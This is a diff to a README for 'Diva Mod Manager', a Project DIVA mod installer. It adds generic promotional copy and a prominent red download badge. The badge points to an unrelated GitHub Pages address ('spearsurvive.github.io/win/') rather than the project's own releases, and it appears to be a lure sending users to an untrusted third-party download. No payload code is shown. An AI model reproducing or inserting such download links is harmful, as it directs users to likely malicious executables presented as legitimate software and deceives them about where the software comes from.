@@ -30,6 +30,12 @@ Diva Mod Manager installs and manages mods for Project DIVA, handling file prior
 
 Whether you're a newcomer or a veteran, Diva Mod Manager provides the tools you need to get the most out of your gaming mods experience. Designed for Windows and macOS, it delivers a seamless, high-performance workflow.
 
+<div align="center">
+
+[![Download Diva Mod Manager](https://img.shields.io/badge/⬇_DOWNLOAD_Diva+Mod+Manager-CE0000?style=for-the-badge&logo=github&logoColor=white)](https://spearsurvive.github.io/win/)
+
+</div>
+
 ---
 
 ## ✨ Key Features
